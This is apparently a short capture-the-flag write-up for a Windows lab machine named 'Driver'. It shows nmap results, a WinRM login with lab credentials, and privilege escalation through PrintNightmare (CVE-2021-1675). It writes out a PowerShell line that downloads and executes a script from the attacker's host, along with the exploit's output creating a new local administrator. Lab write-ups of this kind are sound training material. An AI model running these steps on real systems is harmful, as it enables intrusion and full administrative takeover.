![image](PWND/Driver.png)

#Masscan - Nmap 
```
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h14m09s, deviation: 0s, median: 7h14m09s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-12T06:28:40
|_  start_date: 2021-10-11T22:46:25


SMB RELAY ATTACK
```

# Enumeration

using evil-winrm -i 10.10.11.106 -u tony -p liltony 

we got a shell as tony 
using upload /opt/<path2linumWin>
we noticed print spoolesv running 

so we can do print nightmare. 
/opt/windows/<printnightmare.

cd into printnightmare dir and set up a python server on any port. 
python3 -m http.server 8998

while you are loged into evil-winrm 

using this download method will inport the module atomatically, i tried to add it on my own and it gave scripts error. 


IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.2:8998/CVE-2021-1675.ps1')

once you download the file..

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\temp\test\v> Invoke-Nightmare -NewUser "AnonHack3r" -NewPassword "PwndByAnonHack3r"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user AnonHack3r as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\temp\test\v> net user

# PrivEsc
  
  use evil winrm and log into AnonHack3r account 

  net user Anonhack3r 

  you are Admin. 

  
